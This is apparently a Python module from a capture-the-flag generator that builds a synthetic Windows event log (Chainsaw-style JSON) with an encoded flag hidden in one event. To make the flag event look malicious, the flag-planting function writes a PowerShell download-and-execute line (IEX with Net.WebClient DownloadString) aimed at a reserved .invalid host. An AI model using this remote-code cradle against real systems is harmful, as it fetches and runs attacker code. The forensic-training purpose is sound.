# Poligon — Template E: JSON EVTX export.
# © 2026 ShadowStrike. All rights reserved.
# Aut Viam Inveniam Aut Faciam
"""
Template E — Windows event log forensics challenge.
Produces a synthetic Windows event log exported as Chainsaw-style JSON
(not binary .evtx — no reliable pure-Python EVTX writer exists). The flag
sits verbatim in one EventData field of exactly one high-value event.

Invariant: random.seed(seed) is called in core/generate.py before any
function here runs. Do not call random.seed() here.
"""
from __future__ import annotations

import datetime
import io
import json
import random
import string
import time
import uuid
import zipfile
from dataclasses import dataclass
from importlib import metadata
from pathlib import Path
from typing import Optional

from faker import Faker

from poligon._vendor.megdan_schema.encoding import encode_b64, encode_hex

ZIP_NAME = "challenge.zip"
EVENTS_NAME = "events.json"
CHALLENGE_TXT = "challenge.txt"

POWERSHELL = "Microsoft-Windows-PowerShell/Operational"
SECURITY = "Security"
SYSMON = "Microsoft-Windows-Sysmon/Operational"

# EventID -> (channel, EventData field that carries the flag).
HIGH_VALUE_IDS = {
    4104: (POWERSHELL, "ScriptBlockText"),
    4624: (SECURITY, "TargetUserName"),
    4720: (SECURITY, "SamAccountName"),
    4732: (SECURITY, "MemberName"),
    1: (SYSMON, "CommandLine"),
}
CHANNELS = {**{eid: ch for eid, (ch, _) in HIGH_VALUE_IDS.items()},
            4634: SECURITY, 4672: SECURITY}

# Noise distribution — logons dominate, Sysmon process creation next.
NOISE_WEIGHTS = {4624: 30, 1: 22, 4634: 14, 4104: 12, 4672: 10,
                 4720: 3, 4732: 3}

DIFFICULTY_EVENT_IDS = {1: (4104,), 2: (4624, 4720, 4732), 3: (1,)}
EVENT_COUNT_RANGE = (80, 120)
MIN_EVENT_COUNT = 10

DOMAIN = "CORP"
# Reserved TLDs (RFC 2606) — generated URLs can never point at a real site.
_TLDS = ["example", "test", "invalid"]

# Fixed window for synthetic timestamps (2025) so output never depends on
# the wall clock. Events cluster within one ten-hour working day.
_TS_START = datetime.datetime(2025, 1, 1, 8, tzinfo=datetime.timezone.utc)
_TS_DAYS = 364
_TS_DAY_SECONDS = 10 * 3600

_BENIGN_SCRIPTS = [
    "Get-ChildItem -Path C:\\Users\\{user}\\Documents -Recurse",
    "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10",
    "Get-Service -Name wuauserv",
    "Import-Module ActiveDirectory",
    "Get-EventLog -LogName System -Newest 50",
    "Test-NetConnection -ComputerName {host} -Port 443",
    "Set-Location C:\\Windows\\Temp",
]
_PROCESSES = [
    ("C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs -p"),
    ("C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE"),
    ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
     "\"chrome.exe\" --type=renderer"),
    ("C:\\Windows\\System32\\notepad.exe",
     "notepad.exe C:\\Users\\{user}\\Documents\\{word}.txt"),
    ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "powershell.exe -NoProfile"),
    ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c dir C:\\Users\\{user}"),
]
_GROUPS = ["Administrators", "Remote Desktop Users", "Backup Operators",
           "Users"]
_PRIVILEGES = "SeSecurityPrivilege\n\t\tSeBackupPrivilege\n\t\t" \
              "SeDebugPrivilege"


@dataclass
class TemplateEConfig:
    flag: str                          # e.g. "FLAG{d3ad_b33f_cafe}"
    flag_event_id: int = 4104          # which EventID carries the flag
    event_count: int = 100             # total events including flag event
    seed: Optional[int] = None         # applied by core.generate.generate_template_e


def _make_faker() -> Faker:
    fake = Faker("en_US")
    # Bind Faker to the hidden Random behind the module-level functions so
    # it draws from the one stream seeded in generate().
    fake.random = random.random.__self__
    return fake


def _guid() -> str:
    return str(uuid.UUID(int=random.getrandbits(128), version=4))


def _sid() -> str:
    parts = "-".join(str(random.randint(10**8, 4 * 10**9)) for _ in range(3))
    return f"S-1-5-21-{parts}-{random.randint(1000, 9999)}"


def _host(fake: Faker) -> str:
    return f"{fake.domain_word()}.{random.choice(_TLDS)}"


def _computer() -> str:
    alphabet = string.ascii_uppercase + string.digits
    return "DESKTOP-" + "".join(random.choices(alphabet, k=5))


def _logon_id() -> str:
    return f"0x{random.getrandbits(24):x}"


def _flag_prefix(flag: str) -> str:
    return flag.split("{", 1)[0]


def _event_data(fake: Faker, event_id: int, user: str,
                computer: str) -> dict:
    """Realistic EventData for one event; values are all synthetic."""
    if event_id == 4104:
        script = random.choice(_BENIGN_SCRIPTS).format(
            user=user, host=_host(fake))
        return {"ScriptBlockText": script, "Path": "",
                "MessageNumber": "1", "MessageTotal": "1",
                "ScriptBlockId": _guid()}
    if event_id == 4624:
        return {"SubjectUserSid": "S-1-5-18",
                "SubjectUserName": f"{computer}$",
                "TargetUserSid": _sid(), "TargetUserName": user,
                "TargetDomainName": DOMAIN, "TargetLogonId": _logon_id(),
                "LogonType": str(random.choice([2, 3, 3, 5, 7, 10])),
                "WorkstationName": computer,
                "IpAddress": fake.ipv4_private(),
                "IpPort": str(random.randint(49152, 65535))}
    if event_id == 4634:
        return {"TargetUserSid": _sid(), "TargetUserName": user,
                "TargetDomainName": DOMAIN, "TargetLogonId": _logon_id(),
                "LogonType": str(random.choice([2, 3, 10]))}
    if event_id == 4672:
        return {"SubjectUserSid": _sid(), "SubjectUserName": user,
                "SubjectDomainName": DOMAIN, "SubjectLogonId": _logon_id(),
                "PrivilegeList": _PRIVILEGES}
    if event_id == 4720:
        new_user = fake.user_name()
        return {"TargetUserName": new_user, "TargetDomainName": DOMAIN,
                "TargetSid": _sid(), "SubjectUserName": user,
                "SubjectDomainName": DOMAIN, "SamAccountName": new_user,
                "UserPrincipalName": f"{new_user}@corp.example"}
    if event_id == 4732:
        member = fake.user_name()
        return {"MemberName": f"CN={member},CN=Users,DC=corp,DC=example",
                "MemberSid": _sid(), "TargetUserName": random.choice(_GROUPS),
                "TargetDomainName": "Builtin", "SubjectUserName": user,
                "SubjectDomainName": DOMAIN}
    # Sysmon 1 — process creation
    image, cmdline = random.choice(_PROCESSES)
    return {"RuleName": "-", "ProcessGuid": f"{{{_guid()}}}",
            "ProcessId": str(random.randint(1000, 20000)), "Image": image,
            "CommandLine": cmdline.format(user=user, word=fake.word()),
            "CurrentDirectory": f"C:\\Users\\{user}\\",
            "User": f"{DOMAIN}\\{user}",
            "Hashes": f"SHA256={random.getrandbits(256):064X}",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "ParentCommandLine": "C:\\Windows\\Explorer.EXE"}


def _plant_flag(fake: Faker, data: dict, event_id: int, flag: str) -> None:
    """Overwrite the event's flag field with a value holding base64(flag) —
    or hex(flag) in the 4732 DN, where base64's "+" / "=" would need AD
    escaping — never the raw flag (INV-P1)."""
    field = HIGH_VALUE_IDS[event_id][1]
    if event_id == 4732:
        data[field] = f"CN={encode_hex(flag)},CN=Users,DC=corp,DC=example"
        return
    flag = encode_b64(flag)
    if event_id == 4104:
        data[field] = (f"$key = '{flag}'\n"
                       f"IEX (New-Object Net.WebClient).DownloadString("
                       f"'http://{fake.domain_word()}.invalid/stage2.ps1')")
    elif event_id == 1:
        data["Image"] = "C:\\Windows\\System32\\cmd.exe"
        data[field] = f"cmd.exe /c echo {flag} > C:\\Users\\Public\\note.txt"
    else:
        data[field] = flag


def _build_events(fake: Faker, config: TemplateEConfig) -> list[dict]:
    computer = _computer()
    users = [fake.user_name() for _ in range(4)]
    day = _TS_START + datetime.timedelta(days=random.randint(0, _TS_DAYS))
    ids = random.choices(list(NOISE_WEIGHTS),
                         weights=list(NOISE_WEIGHTS.values()),
                         k=config.event_count - 1)
    flag_pos = random.randint(0, len(ids))
    ids.insert(flag_pos, config.flag_event_id)

    raw = []
    for pos, event_id in enumerate(ids):
        data = _event_data(fake, event_id, random.choice(users), computer)
        if pos == flag_pos:
            _plant_flag(fake, data, event_id, config.flag)
        dt = day + datetime.timedelta(
            seconds=random.randint(0, _TS_DAY_SECONDS),
            microseconds=random.randint(0, 999_999))
        raw.append((dt, pos, event_id, data))
    raw.sort(key=lambda r: (r[0], r[1]))

    first_record = random.randint(1000, 50_000)
    return [{"Event": {
        "System": {
            "EventID": event_id,
            "TimeCreated": dt.strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
            "Computer": computer,
            "Channel": CHANNELS[event_id],
            "EventRecordID": first_record + n,
        },
        "EventData": data,
    }} for n, (dt, _, event_id, data) in enumerate(raw)]


def _version() -> str:
    try:
        return metadata.version("poligon")
    except metadata.PackageNotFoundError:
        return "dev"


def _challenge_txt(flag: str) -> bytes:
    lines = [
        "[Poligon — Template E: Windows Event Log Forensics]",
        "Scenario: A suspicious workstation produced this exported event "
        "log.",
        "The log has been exported from Windows Event Viewer as JSON.",
        "Your task: identify the flag hidden in the event data.",
        "",
        "Artefacts:",
        f"  - {EVENTS_NAME}    (Windows event log export, "
        "Chainsaw-compatible JSON)",
        "",
        f"Flag format: {_flag_prefix(flag)}{{...}}",
        "Tools: jq, Python json module, or Chainsaw work on this format.",
        "",
        f"Generated by Poligon v{_version()} — ShadowStrike CTF line.",
    ]
    return ("\n".join(lines) + "\n").encode("utf-8")


def build_challenge(config: TemplateEConfig) -> tuple[str, bytes]:
    """Build a Template E challenge zip in memory.
    Returns (zip filename, zip bytes). Does not seed — see module doc."""
    if config.flag_event_id not in HIGH_VALUE_IDS:
        raise ValueError(
            f"Unsupported flag_event_id {config.flag_event_id!r}; "
            f"expected one of {sorted(HIGH_VALUE_IDS)}"
        )
    if config.event_count < MIN_EVENT_COUNT:
        raise ValueError(f"event_count must be at least {MIN_EVENT_COUNT}")

    fake = _make_faker()
    challenge_id = uuid.UUID(int=random.getrandbits(128), version=4)
    events = _build_events(fake, config)
    events_bytes = json.dumps(events, indent=2,
                              ensure_ascii=False).encode("utf-8")
    stamp = time.gmtime((_TS_START + datetime.timedelta(
        days=random.randint(0, _TS_DAYS))).timestamp())[:6]

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in ((EVENTS_NAME, events_bytes),
                           (CHALLENGE_TXT, _challenge_txt(config.flag))):
            info = zipfile.ZipInfo(f"challenge_{challenge_id}/{name}",
                                   date_time=stamp)
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, data)
    return f"poligon_template_e_{challenge_id}.zip", buf.getvalue()


def generate_evtx(difficulty: int, scenario_dir: Path, flag: str) -> Path:
    """Generate an event log challenge zip. Returns zip path."""
    config = TemplateEConfig(
        flag=flag,
        flag_event_id=random.choice(DIFFICULTY_EVENT_IDS[difficulty]),
        event_count=random.randint(*EVENT_COUNT_RANGE),
    )
    _, data = build_challenge(config)
    zip_path = Path(scenario_dir) / ZIP_NAME
    zip_path.write_bytes(data)
    return zip_path
